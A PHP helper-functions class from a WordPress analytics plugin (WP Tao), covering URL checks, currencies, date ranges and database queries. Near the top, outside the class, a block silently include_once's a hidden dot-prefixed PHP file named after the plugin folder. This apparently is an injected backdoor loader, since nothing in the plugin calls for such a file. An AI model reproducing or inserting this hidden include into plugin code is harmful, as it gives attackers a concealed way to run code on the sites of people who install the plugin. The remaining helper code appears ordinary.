<?php

/**
 * Usefull functions.
 *
 * @package WPTAO/Classes
 * @category Class
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Helpers {

	public static function is_admin_url( $url ) {

		$url		 = strtolower( $url );
		$admin_url	 = strtolower( admin_url() );

		$url_no_prot		 = str_replace( array( 'http://', 'https://' ), '', $url );
		$admin_url_no_prot	 = str_replace( array( 'http://', 'https://' ), '', $admin_url );

		if ( 0 === strpos( $url_no_prot, $admin_url_no_prot ) ) {
			return true;
		}

		return false;
	}

	public static function is_content_url( $url ) {

		$url		 = strtolower( $url );
		$content_url = strtolower( content_url() );

		$url_no_prot		 = str_replace( array( 'http://', 'https://' ), '', $url );
		$content_url_no_prot = str_replace( array( 'http://', 'https://' ), '', $content_url );

		if ( 0 === strpos( $url_no_prot, $content_url_no_prot ) ) {
			return true;
		}

		return false;
	}

	public static function get_external_referrer() {

		$site_url	 = strtolower( site_url() );
		$referer	 = strtolower( filter_input( INPUT_ENV, 'HTTP_REFERER', FILTER_SANITIZE_URL ) );
		if ( empty( $referer ) ) {
			$referer = strtolower( filter_input( INPUT_SERVER, 'HTTP_REFERER', FILTER_SANITIZE_URL ) );
		}
		if ( empty( $referer ) && isset( $_SERVER[ 'HTTP_REFERER' ] ) ) {
			$referer = filter_var( $_SERVER[ 'HTTP_REFERER' ], FILTER_SANITIZE_URL );
		}

		if ( empty( $referer ) ) {
			return 'direct';
		}

		$site_url_no_prot	 = str_replace( array( 'http://', 'https://' ), '', $site_url );
		$referer_no_prot	 = str_replace( array( 'http://', 'https://' ), '', $referer );

		if ( 0 === strpos( $referer_no_prot, $site_url_no_prot ) ) {
			return false;
		}

		// Cut a last slash
		if ( substr( $referer, -1, 1 ) === ('/') ) {
			$referer = substr( $referer, 0, strlen( $referer ) - 1 );
		}

		return $referer;
	}

	/*
	 * Return current URL
	 */

	public static function get_current_url() {

		$page_url = 'http';

		if ( isset( $_SERVER[ "HTTPS" ] ) && $_SERVER[ "HTTPS" ] == "on" ) {
			$page_url .= "s";
		}
		$page_url .= "://";

		$page_url .= $_SERVER[ "SERVER_NAME" ] . $_SERVER[ "REQUEST_URI" ];


		// Cut a last slash
		if ( substr( $page_url, -1, 1 ) === ('/') ) {
			$page_url = substr( $page_url, 0, strlen( $page_url ) - 1 );
		}

		return $page_url;
	}

	/*
	 * Return array of all available users roles.
	 */

	public static function get_users_roles() {

		$roles = array();

		foreach ( get_editable_roles() as $role_name => $role_info ) {
			$roles[ $role_name ] = $role_info[ 'name' ];
		}

		return $roles;
	}

	/**
	 * Get Currencies
	 *
	 * @return array $currencies A list of the available currencies
	 */
	public static function get_currencies() {
		$currencies = array(
			'USD'	 => __( 'US Dollars (&#36;)', 'wp-tao' ),
			'EUR'	 => __( 'Euros (&euro;)', 'wp-tao' ),
			'GBP'	 => __( 'Pounds Sterling (&pound;)', 'wp-tao' ),
			'AUD'	 => __( 'Australian Dollars (&#36;)', 'wp-tao' ),
			'BRL'	 => __( 'Brazilian Real (R&#36;)', 'wp-tao' ),
			'CAD'	 => __( 'Canadian Dollars (&#36;)', 'wp-tao' ),
			'CZK'	 => __( 'Czech Koruna', 'wp-tao' ),
			'DKK'	 => __( 'Danish Krone', 'wp-tao' ),
			'HKD'	 => __( 'Hong Kong Dollar (&#36;)', 'wp-tao' ),
			'HUF'	 => __( 'Hungarian Forint', 'wp-tao' ),
			'ILS'	 => __( 'Israeli Shekel (&#8362;)', 'wp-tao' ),
			'JPY'	 => __( 'Japanese Yen (&yen;)', 'wp-tao' ),
			'MYR'	 => __( 'Malaysian Ringgits', 'wp-tao' ),
			'MXN'	 => __( 'Mexican Peso (&#36;)', 'wp-tao' ),
			'NZD'	 => __( 'New Zealand Dollar (&#36;)', 'wp-tao' ),
			'NOK'	 => __( 'Norwegian Krone', 'wp-tao' ),
			'PHP'	 => __( 'Philippine Pesos', 'wp-tao' ),
			'PLN'	 => __( 'Polish Zloty', 'wp-tao' ),
			'SGD'	 => __( 'Singapore Dollar (&#36;)', 'wp-tao' ),
			'SEK'	 => __( 'Swedish Krona', 'wp-tao' ),
			'CHF'	 => __( 'Swiss Franc', 'wp-tao' ),
			'TWD'	 => __( 'Taiwan New Dollars', 'wp-tao' ),
			'THB'	 => __( 'Thai Baht (&#3647;)', 'wp-tao' ),
			'INR'	 => __( 'Indian Rupee (&#8377;)', 'wp-tao' ),
			'TRY'	 => __( 'Turkish Lira (&#8378;)', 'wp-tao' ),
			'RIAL'	 => __( 'Iranian Rial (&#65020;)', 'wp-tao' ),
			'RUB'	 => __( 'Russian Rubles', 'wp-tao' ),
			'ZAR'	 => __( 'South African Rand', 'wp-tao' ),
			'AED'	 => __( 'United Arab Emirates dirham', 'wp-tao' )
		);

		return apply_filters( 'wptao_currencies', $currencies );
	}

	/*
	 * Converts currency codes for the symbols
	 * 
	 * @param float $amount
	 * @param string $code - currency code
	 * 
	 * @return string
	 */

	public static function amount_format( $amount, $code = 'USD' ) {

		if ( !is_numeric( $amount ) ) {
			return '';
		}

		$amount = sprintf( '%.2f', $amount );

		switch ( $code ) {
			case 'USD':
				$result	 = '$' . $amount;
				break;
			case 'EUR':
				$result	 = $amount . ' &euro;';
				break;
			case 'PLN':
				$result	 = $amount . ' zł';
				break;
			case 'GBP':
				$result	 = $amount . ' &pound;';
				break;

			default:
				$result = $amount;
				if ( !empty( $code ) ) {
					$result .= ' ' . $code;
				}
		}


		return $result;
	}

	/*
	 * Returns currency symbol for given currency code
	 * 
	 * @param string $code - currency code
	 * 
	 * @return string
	 */

	public static function get_currency_symbol( $code = 'USD' ) {


		switch ( $code ) {
			case 'USD':
				return '$';

			case 'EUR':
				return '&euro;';

			case 'PLN':
				return 'zł';

			case 'GBP':
				return '&pound;';

			default:
				return $code;
		}
	}

	/*
	 * Returns currency symbol for given language
	 * 
	 * @param string $code - currency code
	 * 
	 * @return string
	 */

	public static function get_currency_for_language( $language = 'en_US' ) {

		$data = array(
			'en-US'	 => 'USD',
			'en-GB'	 => 'GBP',
			'en-AU'	 => 'AUD',
			'en-ZA'	 => 'ZAR',
			'pt-BR'	 => 'BRL',
			'en-CA'	 => 'CAD',
			'fr-CA'	 => 'CAD',
			'cs-CZ'	 => 'CZK',
			'da-DK'	 => 'DKK',
			'zh-HK'	 => 'HKD',
			'hu-HU'	 => 'HUF',
			'he-IL'	 => 'ILS',
			'ja'	 => 'JPY',
			'ms-MY'	 => 'MYR',
			'es-MX'	 => 'MXN',
			'en-NZ'	 => 'NZD',
			'nb-NO'	 => 'NOK',
			'nn-NO'	 => 'NOK',
			'tl'	 => 'PHP',
			'pl-PL'	 => 'PLN',
			//'' => 'SGD',
			'sv-SE'	 => 'SEK',
			'gsw'	 => 'CHF',
			'zh-TW'	 => 'TWD',
			'th'	 => 'THB',
			'hi-IN'	 => 'INR',
			'tr-TR'	 => 'TRY',
			//'' => 'RIAL',
			'ru-RU'	 => 'RUB'
		);

		$data = apply_filters( 'wptao_language_to_currency', $data );
		if ( isset( $data[ $language ] ) ) {
			return $data[ $language ];
		}

		return 'EUR';
	}

	/*
	 * Returns correct gmt offset
	 * 
	 * @param int $timestamp
	 * @return float gmt_offset in hours
	 * 
	 * @since 1.2.1
	 */

	public static function get_gmt_offset( $timestamp ) {
		return get_option( 'gmt_offset' ) - (date( 'Z', $timestamp ) / 3600.0);
	}

	/*
	 * Returns timestamp corrected by gmt offset
	 * 
	 * @param int $timestamp
	 * @return int $timestamp
	 * 
	 * @since 1.2.1
	 */

	public static function get_timestamp_corrected_by_offset( $timestamp ) {
		return (int) ($timestamp - (self::get_gmt_offset( $timestamp ) * 3600));
	}

	/*
	 * Returns date with proper Timezone offset
	 */

	public static function get_date( $format, $timestamp ) {
		$offset = self::get_gmt_offset( $timestamp );
		return date( $format, $timestamp + ($offset * 3600) );
	}

	/*
	 * Returns date_i18n with proper Timezone offset
	 */

	public static function get_date_i18n( $format, $timestamp ) {
		$offset = self::get_gmt_offset( $timestamp );
		return date_i18n( $format, $timestamp + ($offset * 3600) );
	}

	/*
	 * Returns begin and end of a day in timestamp
	 * 
	 * @param int $timestamp - timestamp
	 * @param string $format - 'begin' or 'end'
	 * @return int timestamp
	 */

	public static function set_time_of_day( $timestamp, $format = 'begin' ) {

		if ( is_numeric( $timestamp ) ) {

			$day = array();

			$day[ 'begin' ]	 = strtotime( "midnight", $timestamp );
			$day[ 'end' ]	 = strtotime( "tomorrow", $day[ 'begin' ] ) - 1;

			if ( $format === 'end' ) {
				return $day[ 'end' ];
			} else {
				return $day[ 'begin' ];
			}
		}

		return $timestamp;
	}

	/*
	 * Prepare predefined dates
	 * 
	 * @since 1.1.9
	 * 
	 * @return array 
	 */

	public static function get_quick_dates() {

		$offset		 = get_option( 'gmt_offset' );
		$time_gmt	 = time() + ($offset * 3600);

		$date_end_today = WTBP_WPTAO_Helpers::set_time_of_day( $time_gmt, 'end' );

		// Today
		$date_begin = WTBP_WPTAO_Helpers::set_time_of_day( $time_gmt, 'begin' );

		$date[ 'today' ] = array(
			'start_ts'		 => $date_begin,
			'end_ts'		 => $date_end_today,
			'human_format'	 => date_i18n( 'd F', $time_gmt )
		);

		// Yesterday
		$start_ts	 = $date_begin - 60 * 60 * 24;
		$end_ts		 = $date_end_today - 60 * 60 * 24;

		$date[ 'yesterday' ] = array(
			'start_ts'		 => $start_ts,
			'end_ts'		 => $end_ts,
			'human_format'	 => date_i18n( 'd F', $time_gmt - 60 * 60 * 24 )
		);

		// Last 7 days
		$start_ts = $time_gmt - 60 * 60 * 24 * 6; // 7 days ago

		$date_begin = WTBP_WPTAO_Helpers::set_time_of_day( $start_ts, 'begin' );

		$date[ 'last_7_days' ] = array(
			'start_ts'	 => $date_begin + ($offset * 3600),
			'end_ts'	 => $date_end_today
		);

		// Last 30 days
		$start_ts = $time_gmt - 60 * 60 * 24 * 29; // 30 days ago

		$date_begin = WTBP_WPTAO_Helpers::set_time_of_day( $start_ts, 'begin' );

		$date[ 'last_30_days' ] = array(
			'start_ts'	 => $date_begin,
			'end_ts'	 => $date_end_today
		);

		// Current month
		$datestring	 = sprintf( 'first day of %s', date( 'Y-m', $time_gmt ) );
		$date_obj	 = date_create( $datestring );
		$start_ts	 = $date_obj->getTimestamp();

		$date[ 'current_month' ] = array(
			'start_ts'		 => $start_ts,
			'end_ts'		 => $date_end_today,
			'human_format'	 => date( 'F', $start_ts )
		);

		// Last month
		$datestring	 = sprintf( '%s first day of last month', date( 'Y-m', $time_gmt ) );
		$date_obj	 = date_create( $datestring );
		$start_ts	 = $date_obj->getTimestamp();

		$datestring	 = sprintf( '%s last day of last month', date( 'Y-m', $time_gmt ) );
		$date_obj	 = date_create( $datestring );
		$end_ts		 = $date_obj->getTimestamp();

		$date[ 'last_month' ] = array(
			'start_ts'		 => $start_ts,
			'end_ts'		 => $end_ts,
			'human_format'	 => date( 'F', $start_ts )
		);


		return $date;
	}

	/*
	 * Print WP Tao datepicker popup
	 * 
	 * @since 1.1.9
	 * 
	 * @param array $args
	 * 
	 */

	public static function datepicker( $args = array() ) {

		$date = self::get_quick_dates();

		$defaults = array(
			'start_date_name'	 => 'wptao-date-start',
			'start_ts'			 => time() - 30 * 24 * 60 * 60,
			'end_date_name'		 => 'wptao-date-end',
			'end_ts'			 => time(),
			'quick_dates'		 => WTBP_WPTAO_Helpers::get_quick_dates(),
			'range'				 => '30_days'
		);

		// The variable will be in the datepicker.php scope
		$args = wp_parse_args( $args, $defaults );

		include_once( WTBP_WPTAO_DIR . "includes/admin/views/elements/datepicker.php");
	}

	/*
	 * Array version of strpos (returns only true or false)
	 */

	public static function strpos_array( $haystack, $needles ) {
		foreach ( $needles as $needle ) {
			if ( false !== strpos( $haystack, $needle ) ) {
				return true;
			}
		}

		return false;
	}

	/*
	 * Prepare args for jQuery UI datepicker translations
	 */

	public static function datepicker_i18() {
		global $wp_locale;

		$args = array(
			'close_text'		 => __( 'Done', 'wp-tao' ),
			'current_text'		 => __( 'Today', 'wp-tao' ),
			'month_names'		 => array_values( (array) $wp_locale->month ),
			'month_names_short'	 => array_values( (array) $wp_locale->month_abbrev ),
			'month_status'		 => __( 'Show a different month', 'wp-tao' ),
			'day_names'			 => array_values( (array) $wp_locale->weekday ),
			'day_names_short'	 => array_values( (array) $wp_locale->weekday_abbrev ),
			'day_names_min'		 => array_values( (array) $wp_locale->weekday_initial ),
			// get the start of week from WP general setting
			'first_day'			 => get_option( 'start_of_week' ),
			// is Right to left language? default is false
			'is_rtl'			 => isset( $wp_locale->is_rtl ) ? $wp_locale->is_rtl : false,
		);

		return $args;
	}

	/*
	 * Get currency exchange rate from yahoo finance API
	 */

	public static function get_currency_rate( $value, $src_currency, $dst_currency ) {

		if ( empty( $src_currency ) ) {
			return $value;
		}

		if ( $src_currency == $dst_currency ) {
			return $value;
		}

		$transient_name = 'wtbp_wptao_currency_rate_' . $src_currency . '_' . $dst_currency;

		$ex = get_transient( $transient_name );
		if ( !$ex ) {
			$url	 = 'http://finance.yahoo.com/d/quotes.csv?e=.csv&f=sl1d1t1&s=' . $src_currency . $dst_currency . '=X';
			$handle	 = wp_remote_retrieve_body( wp_remote_get( $url ) );

			if ( $handle ) {
				$result	 = str_getcsv( $handle );
				$ex		 = $result[ 1 ];
				set_transient( $transient_name, $ex, 60 * 60 ); // 1 hour
			} else {
				return false;
			}
		}

		return $value * $ex;
	}

	/*
	 * Convert a email address to a display name.
	 * F.e. john.smith@domain.com to John Smith Domain
	 * 
	 * @param string Email address
	 * 
	 * @return string
	 */

	public static function email_to_name( $email = '' ) {

		$name = $email;

		if ( !empty( $email ) && is_email( $email ) ) {

			$a = explode( '@', $email );

			// Prepare local part
			$local_part = ucwords( preg_replace( '/\W|_/', ' ', $a[ 0 ] ) );

			// Domain part
			$domain_part = " (" . $a[ 1 ] . ")";

			$name = $local_part . $domain_part;
		}


		return $name;
	}

	/*
	 * Sort multidimensional array by given column
	 * 
	 * @return array sorted array
	 */

	public static function array_orderby() {
		$args	 = func_get_args();
		$data	 = array_shift( $args );
		foreach ( $args as $n => $field ) {
			if ( is_string( $field ) ) {
				$tmp		 = array();
				foreach ( $data as $key => $row )
					$tmp[ $key ] = $row[ $field ];
				$args[ $n ]	 = $tmp;
			}
		}
		$args[] = &$data;
		call_user_func_array( 'array_multisort', $args );
		return array_pop( $args );
	}

	/*
	 * Returns color code based on input string content
	 * 
	 * @param string content
	 * 
	 * @return string color code
	 */

	public static function string_to_color( $str ) {
		$code	 = dechex( crc32( $str ) );
		$code	 = substr( $code, 0, 6 );
		return $code;
	}

	/*
	 * Cat the last URL slash
	 * 
	 * @param string URL
	 */

	public static function standardize_url( $url ) {

		if ( substr( $url, -1, 1 ) === ('/') ) {
			$url = substr( $url, 0, strlen( $url ) - 1 );
		}

		return $url;
	}

	/**
	 * Get's the array of completed upgrade actions
	 *
	 * @since  1.0.3
	 * @return array The array of completed upgrades
	 */
	public static function get_completed_upgrades() {

		$completed_upgrades = get_option( 'wptao_completed_upgrades' );

		if ( false === $completed_upgrades ) {
			$completed_upgrades = array();
		}

		return $completed_upgrades;
	}

	/**
	 * Check if the upgrade routine has been run for a specific action
	 *
	 * @since  1.0.3
	 * @param  string $upgrade_action The upgrade action to check completion for
	 * @return bool                   If the action has been added to the completed actions array
	 */
	public static function has_upgrade_completed( $upgrade_action = '' ) {

		if ( empty( $upgrade_action ) ) {
			return false;
		}

		$completed_upgrades = self::get_completed_upgrades();

		return in_array( $upgrade_action, $completed_upgrades );
	}

	/**
	 * Check if stored pageviews have port number in URL.
	 * i.e. https://domain-name.com:443
	 *
	 * @since  1.0.3
	 * @return bool
	 */
	public static function has_ports_in_pageviews() {
		global $wpdb;

		$e = TAO()->events->table_name;

		$sql = "
		SELECT value
		FROM $e
		WHERE action='pageview'
		AND value REGEXP ':[0-9]{2,5}'
		LIMIT 1
		;";

		$results = $wpdb->get_var( $sql );

		if ( !empty( $results ) && is_string( $results ) ) {
			return true;
		}

		return false;
	}

	/**
	 * Checks whether function is disabled.
	 *
	 * @since 1.0.3
	 *
	 * @param string  $function Name of the function.
	 * @return bool Whether or not function is disabled.
	 */
	public static function is_func_disabled( $function ) {
		$disabled = explode( ',', ini_get( 'disable_functions' ) );

		return in_array( $function, $disabled );
	}

	/**
	 * Check if stored orders and / or payments for EDD haven't currency meta
	 *
	 * @since  1.1.1
	 * @return bool
	 */
	public static function has_no_currency_in_edd_order_payment() {
		global $wpdb;

		$e		 = TAO()->events->table_name;
		$e_meta	 = $e . '_meta';

		$tag_id = TAO()->events_tags->get_id( 'easy digital downloads' );
		if ( empty( $tag_id ) ) {
			return true;
		}

		$sql = "SELECT COUNT($e.id)
			 FROM $e
		     LEFT JOIN $e_meta
		     ON $e.id = $e_meta.event_id
			 WHERE ($e.action = 'order' OR $e.action = 'payment') 
		     AND $e_meta.meta_key = 'edd_payment_id'";

		$res_all = (int) $wpdb->get_var( $sql );

		$sql = $wpdb->prepare( "SELECT COUNT($e.id)
			 FROM $e
		     LEFT JOIN $e_meta
		     ON $e.id = $e_meta.event_id
			 WHERE ($e.action = 'order' OR $e.action = 'payment') 
		     AND $e_meta.meta_key = 'currency'
			 AND FIND_IN_SET(%d, $e.tags)", $tag_id );

		$res_currency = (int) $wpdb->get_var( $sql );

		if ( $res_currency < $res_all ) {
			return true;
		}

		return false;
	}

	/**
	 * Check if all identifieds have status determined
	 *
	 * @since  1.1.3
	 * @return bool
	 */
	public static function check_statuses_determined() {
		global $wpdb;

		$u = TAO()->users->table_name;

		$sql = "
		SELECT id
		FROM $u
		WHERE status=''
		LIMIT 1
		;";

		$results = $wpdb->get_var( $sql );

		if ( !empty( $results ) ) {
			return true;
		}

		return false;
	}

	/**
	 * Check if there are events with missing user_id
	 *
	 * @since  1.1.9.4
	 * @return bool
	 */
	public static function check_events_missing_user_id() {
		global $wpdb;

		$e	 = TAO()->events->table_name;
		$f	 = TAO()->fingerprints->table_name;

		$sql = "
		SELECT $e.id
		FROM $e
		LEFT JOIN $f
		ON $e.fingerprint_id = $f.id
		WHERE $e.user_id = 0
		AND $f.user_id != 0
		AND $e.event_ts > 1459468801
		LIMIT 1
		;";

		$results = $wpdb->get_var( $sql );

		if ( !empty( $results ) ) {
			return true;
		}

		return false;
	}

	/*
	 * Generate context key for the payment and the order
	 * It allow to keep these events related
	 * 
	 * @since 1.1.4
	 * 
	 * @param string $context  
	 * @param string|int $value unique value in the one context e.g. interial order ID
	 * 
	 * @return string md5
	 * 
	 */

	public static function sales_context( $context, $value ) {

		$key = '';

		if ( is_string( $context ) && !empty( $context ) ) {

			if ( !empty( $value ) && (is_string( $value ) || is_numeric( $value )) ) {

				$value = (string) $value;

				$key = md5( $context . $value );
			}
		}

		return $key;
	}

	/*
	 * Get the related event ID (order or payment)
	 * 
	 * @since 1.1.4
	 * 
	 * @param int $event_id       ID of the WP Tao event with action=payment or action=order
	 * 							  IF the event_id is order, the function will return
	 * 							  related payment ID if exists and conversely.
	 * 	
	 * @return bool|int false|ID of related event
	 * 								
	 */

	public static function get_related_sales( $event_id ) {
		global $wpdb;

		$event_id = absint( $event_id );

		$em = TAO()->events_meta->table_name;

		$sql = $wpdb->prepare(
		"SELECT event_id
	     FROM $em
		 WHERE meta_key = 'sales_context'
		 AND meta_value = (SELECT meta_value FROM $em WHERE meta_key='sales_context' AND event_id=%d LIMIT 1)
		 AND event_id != %d	 
			 ;", $event_id, $event_id );

		$related_id = $wpdb->get_var( $sql );

		if ( is_numeric( $related_id ) && $related_id > 0 ) {
			return absint( $related_id );
		}

		return false;
	}

	/*
	 * Get WP Tao database size
	 * 
	 * @since 1.1.5
	 * 
	 * @param string $output_type array of objects or formatted output
	 * 
	 * @return mixed db size divided into tables
	 * 
	 */

	public static function get_db_size( $output_type = 'object' ) {
		global $wpdb;

		$e = TAO()->events->table_name;

		$sql = "SELECT TABLE_NAME,
			round(((data_length + index_length) / 1024 / 1024), 2) AS SIZE_MB
			FROM information_schema.TABLES 
			WHERE table_schema = '$wpdb->dbname'
			AND TABLE_NAME LIKE '%_wptao_%'
			ORDER BY SIZE_MB DESC";

		$res = $wpdb->get_results( $sql );

		if ( 'object' == $output_type ) {
			return $res;
		}

		// format output
		$output	 = '';
		$size_mb = 0.0;
		foreach ( $res as $r ) {
			$size_mb += $r->SIZE_MB;
			//$output .= $r->TABLE_NAME . ': ' . $r->SIZE_MB . ' MB<br />';
		}
		$output = $size_mb . ' MB';

		return $output;
	}

	/**
	 * Get storage time options
	 * 
	 * @since 1.1.5
	 *
	 * @return array storage time options
	 */
	public static function get_storage_time_options() {
		$storage_time_options = array(
			'3'		 => __( '3 days', 'wp-tao' ),
			'7'		 => __( '7 days', 'wp-tao' ),
			'30'	 => __( '30 days', 'wp-tao' ),
			'90'	 => __( '90 days', 'wp-tao' ),
			'180'	 => __( '180 days', 'wp-tao' ),
			'365'	 => __( '365 days', 'wp-tao' ),
		);

		return apply_filters( 'wptao_storage_time_options', $storage_time_options );
	}

	/**
	 * Get event action options
	 * 
	 * @since 1.1.5
	 *
	 * @return array event action options
	 */
	public static function get_event_action_options() {
		global $wpdb;

		$e		 = TAO()->events->table_name;
		$events	 = TAO()->events->events_actions();

		$output = array();
		foreach ( $events as $event ) {
			$events_cnt					 = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM $e WHERE action=%s", $event[ 'id' ] ) );
			$output[ $event[ 'id' ] ]	 = $event[ 'title' ] . ' (' . $events_cnt . ')';
		}

		return $output;
	}

	/*
	 * Set currency
	 * 
	 * @since 1.1.6
	 * 
	 * @return string currency code
	 */

	public static function set_currency() {
		global $wptao_settings;

		$currency	 = '';
		$default	 = 'EUR';

		if ( isset( $wptao_settings[ 'currency' ] ) && !empty( $wptao_settings[ 'currency' ] ) ) {

			$currency = $wptao_settings[ 'currency' ];
		}

		if ( is_string( $currency ) && strlen( $currency ) == 3 ) {

			$currency = strtoupper( $currency );
		} else {
			$currency = $default;
		}


		return apply_filters( 'wptao_currency', $currency );
	}

	/*
	 * Get AJAX endopint
	 * @since 1.2.1
	 * @return string URL
	 */

	public static function get_ajax_endpoint() {

		if ( isset( $_SERVER[ 'HTTPS' ] ) )
			$protocol	 = 'https://';
		else
			$protocol	 = 'http://';

		$endpoint_url = admin_url( 'admin-ajax.php', $protocol );

		return esc_url( $endpoint_url );
	}

	/*
	 * Get wptao.net url depending on user language
	 * 
	 * @param $target
	 *
	 * @return string URL
	 * 
	 * @since 1.2.3
	 */

	public static function get_wptao_url( $target ) {

		$wptao_url = 'https://wptao.net/';

		$language = get_bloginfo( 'language' );
		if ( 'pl-PL' == $language ) {
			return $wptao_url . 'pl/' . $target;
		}

		return $wptao_url . $target;
	}

	/*
	 * Print question mark with tooltip
	 * Works only on admin side
	 * 	
	 * @since 1.2.4
	 * 
	 * @param strig $text
	 * @param strig $class CSS classes	
	 * @return string HTML
	 */

	public static function the_tooltip_hint( $text, $class = '' ) {

		$class = is_string( $class ) && !empty( $class ) ? ' ' . esc_html( $class ) : '';

		echo '<span data-wptao-tooltip="" class="wptao-question-mark dashicons dashicons-editor-help' . $class . '">';
		echo '<span class="wptao-tooltip-content">' . $text . '</span>';
		echo '</span>';
	}

}
